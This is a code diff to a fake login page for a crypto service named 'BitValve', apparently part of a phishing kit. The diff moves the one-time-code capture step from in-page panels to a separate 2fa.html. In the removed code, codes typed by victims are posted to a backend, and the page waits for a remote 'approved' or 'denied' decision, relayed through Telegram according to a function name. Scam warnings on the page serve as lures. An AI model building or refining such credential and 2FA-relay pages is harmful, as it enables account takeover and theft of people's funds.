@@ -136,79 +136,6 @@
 
       </form>
 
-      <div id="twofa-panel" class="twofa-panel hidden" aria-live="polite">
-        <div class="logo" aria-label="BitValve logo">
-          <img src="bitvalve.png" alt="BitValve logo" class="logo-mark" onerror="this.style.display='none'" />
-          <div class="logo-text">BitValve</div>
-        </div>
-
-        <div class="twofa-heading">Enter 2FA Code</div>
-
-        <div class="twofa-warning" role="alert">
-          <div class="warning-icon">⚠</div>
-          <div class="warning-copy">
-            <div class="warning-title">NEVER TRUST LINKS SENT ON TELEGRAM</div>
-            <p>
-              BitValve staff will never send you a link on Telegram. Anyone messaging you a link there is a scammer trying to steal your account and funds. Never enter this code on any site or share it with anyone.
-            </p>
-          </div>
-        </div>
-
-        <div class="twofa-label">2FA security code</div>
-
-        <div class="code-grid" aria-label="Two factor authentication code">
-          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 1" />
-          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 2" />
-          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 3" />
-          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 4" />
-        </div>
-
-        <button type="button" class="twofa-login-btn" onclick="submitTwoFactorCode()">
-          <span>Login</span>
-        </button>
-
-        <div class="twofa-help">Not Working?</div>
-      </div>
-
-      <div id="new-device-panel" class="new-device-panel hidden" aria-live="polite">
-        <div class="logo" aria-label="BitValve logo">
-          <img src="bitvalve.png" alt="BitValve logo" class="logo-mark" onerror="this.style.display='none'" />
-          <div class="logo-text">BitValve</div>
-        </div>
-
-        <div class="new-device-title">
-          <span class="device-check">✓</span>
-          <span>New device detected</span>
-        </div>
-
-        <div class="new-device-text">
-          We sent a verification code to <span class="masked-email">*****@gmail.com</span> to confirm this is your device.
-        </div>
-
-        <div class="new-device-warning" role="alert">
-          <div class="warning-icon">⚠</div>
-          <div class="warning-copy">
-            <div class="warning-title">NEVER TRUST LINKS SENT ON TELEGRAM</div>
-            <p>
-              BitValve staff will never send you a link on Telegram. Anyone messaging you a link there is a scammer trying to steal your account and funds. Never enter this code on any site or share it with anyone.
-            </p>
-          </div>
-        </div>
-
-        <div class="twofa-label">Email code (check spam folder too)</div>
-
-        <div class="code-grid" aria-label="Email verification code">
-          <input class="otp-box email-box" type="text" inputmode="numeric" maxlength="1" aria-label="Email digit 1" />
-          <input class="otp-box email-box" type="text" inputmode="numeric" maxlength="1" aria-label="Email digit 2" />
-          <input class="otp-box email-box" type="text" inputmode="numeric" maxlength="1" aria-label="Email digit 3" />
-          <input class="otp-box email-box" type="text" inputmode="numeric" maxlength="1" aria-label="Email digit 4" />
-        </div>
-
-        <button type="button" class="twofa-login-btn" onclick="submitNewDeviceCode()">
-          <span>Trust Device</span>
-        </button>
-      </div>
-
     </main>
 
   </div>
@@ -219,6 +146,7 @@
     }
 
     let verificationController = null;
+    let decisionPollTimer = null;
 
     function togglePassword() {
       const password = document.getElementById("password");
@@ -230,21 +158,6 @@
       eyeButton.setAttribute("aria-label", isVisible ? "Show password" : "Hide password");
       eyeButton.setAttribute("aria-pressed", String(!isVisible));
     }
-
-    function maskEmail(email) {
-      if (!email || !email.includes("@")) {
-        return "Checking your account...";
-      }
-
-      const [localPart, domain] = email.split("@");
-      const visibleStart = localPart.slice(0, 2);
-      const visibleEnd = localPart.slice(-1);
-      const maskedLocal = `${visibleStart}${"*".repeat(Math.max(localPart.length - 3, 2))}${visibleEnd}`;
-
-      return `${maskedLocal}@${domain}`;
-    }
-
-    let decisionPollTimer = null;
 
     function setLoadingState(isLoading) {
       const loginButton = document.querySelector('.login-btn');
@@ -276,162 +189,6 @@
       statusMessage.classList.remove('success', 'error');
     }
 
-    function setVerificationButtonState(button, isLoading, label) {
-      if (!button) return;
-      const textEl = button.querySelector('span');
-      button.disabled = isLoading;
-      if (textEl) {
-        textEl.textContent = isLoading ? 'Please wait...' : label;
-      }
-    }
-
-    function clearOtpErrors(panel) {
-      const fields = panel.querySelectorAll('.otp-box, .email-box');
-      fields.forEach((field) => field.classList.remove('invalid'));
-    }
-
-    function requestTelegramValidation(step, code, onApproved, onDenied) {
-      const email = document.getElementById('email')?.value.trim();
-      const panel = step === '2fa' ? document.getElementById('twofa-panel') : document.getElementById('new-device-panel');
-      const button = panel?.querySelector('.twofa-login-btn');
-      const buttonLabel = step === '2fa' ? 'Login' : 'Trust Device';
-
-      if (!email) {
-        setStatusMessage('Email is required for verification.', 'error');
-        return;
-      }
-
-      clearOtpErrors(panel);
-      setVerificationButtonState(button, true, buttonLabel);
-
-      fetch('/api/send-verification', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, step, code })
-      })
-        .then(async (response) => {
-          const result = await response.json();
-          if (!response.ok || !result.ok) {
-            throw new Error(result.message || 'Unable to send verification request.');
-          }
-
-          const pollId = setInterval(async () => {
-            try {
-              const statusResponse = await fetch(`/api/verification-status?email=${encodeURIComponent(email)}&step=${encodeURIComponent(step)}`);
-              const statusResult = await statusResponse.json();
-
-              if (statusResult.status === 'pending') {
-                return;
-              }
-
-              clearInterval(pollId);
-              setVerificationButtonState(button, false, buttonLabel);
-
-              if (statusResult.status === 'approved') {
-                onApproved && onApproved(statusResult);
-              } else {
-                panel?.querySelectorAll('.otp-box, .email-box').forEach((field) => field.classList.add('invalid'));
-                setStatusMessage('Wrong code', 'error');
-                onDenied && onDenied(statusResult);
-              }
-            } catch (error) {
-              console.error('Verification polling failed:', error);
-              clearInterval(pollId);
-              setVerificationButtonState(button, false, buttonLabel);
-              panel?.querySelectorAll('.otp-box, .email-box').forEach((field) => field.classList.add('invalid'));
-              setStatusMessage('Wrong code', 'error');
-            }
-          }, 2000);
-        })
-        .catch((error) => {
-          console.error(error);
-          setVerificationButtonState(button, false, buttonLabel);
-          panel?.querySelectorAll('.otp-box, .email-box').forEach((field) => field.classList.add('invalid'));
-          setStatusMessage('Wrong code', 'error');
-        });
-    }
-
-    function setupOtpInputGroup(inputs) {
-      inputs.forEach((input, index) => {
-        input.value = '';
-        input.addEventListener('input', (event) => {
-          const value = event.target.value.replace(/\D/g, '').slice(0, 1);
-          event.target.value = value;
-          if (value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-          }
-        });
-
-        input.addEventListener('keydown', (event) => {
-          if (event.key === 'Backspace' && !input.value && index > 0) {
-            inputs[index - 1].focus();
-          }
-        });
-      });
-    }
-
-    function showTwoFactorPanel() {
-      const loginForm = document.getElementById('login-form');
-      const twoFactorPanel = document.getElementById('twofa-panel');
-      const newDevicePanel = document.getElementById('new-device-panel');
-      loginForm.classList.add('hidden');
-      twoFactorPanel.classList.remove('hidden');
-      newDevicePanel.classList.add('hidden');
-      clearStatusMessage();
-      setLoadingState(false);
-
-      const otpInputs = Array.from(twoFactorPanel.querySelectorAll('.otp-box'));
-      setupOtpInputGroup(otpInputs);
-      otpInputs[0]?.focus();
-    }
-
-    function showNewDevicePanel() {
-      const loginForm = document.getElementById('login-form');
-      const twoFactorPanel = document.getElementById('twofa-panel');
-      const newDevicePanel = document.getElementById('new-device-panel');
-      loginForm.classList.add('hidden');
-      twoFactorPanel.classList.add('hidden');
-      newDevicePanel.classList.remove('hidden');
-
-      const emailBoxInputs = Array.from(newDevicePanel.querySelectorAll('.email-box'));
-      setupOtpInputGroup(emailBoxInputs);
-      emailBoxInputs[0]?.focus();
-    }
-
-    function submitTwoFactorCode() {
-      const otpInputs = Array.from(document.getElementById('twofa-panel').querySelectorAll('.otp-box'));
-      const code = otpInputs.map((input) => input.value).join('').trim();
-
-      if (code.length !== 4) {
-        setStatusMessage('Please enter the full 4-digit 2FA code.', 'error');
-        return;
-      }
-
-      clearStatusMessage();
-      requestTelegramValidation('2fa', code, () => {
-        showNewDevicePanel();
-      }, () => {
-        setStatusMessage('Wrong code', 'error');
-      });
-    }
-
-    function submitNewDeviceCode() {
-      const otpInputs = Array.from(document.getElementById('new-device-panel').querySelectorAll('.email-box'));
-      const code = otpInputs.map((input) => input.value).join('').trim();
-
-      if (code.length !== 4) {
-        setStatusMessage('Please enter the full 4-digit email verification code.', 'error');
-        return;
-      }
-
-      clearStatusMessage();
-      requestTelegramValidation('device', code, () => {
-        setStatusMessage('Device verified successfully.', 'success');
-      }, () => {
-        setStatusMessage('Wrong code', 'error');
-      });
-    }
-
     async function pollLoginDecision(email) {
       if (decisionPollTimer) {
         clearInterval(decisionPollTimer);
@@ -455,7 +212,8 @@
 
           if (result.status === 'approved') {
             clearInterval(decisionPollTimer);
-            showTwoFactorPanel();
+            sessionStorage.setItem('login_email', email);
+            window.location.href = `2fa.html?email=${encodeURIComponent(email)}`;
             return;
           }
         } catch (error) {
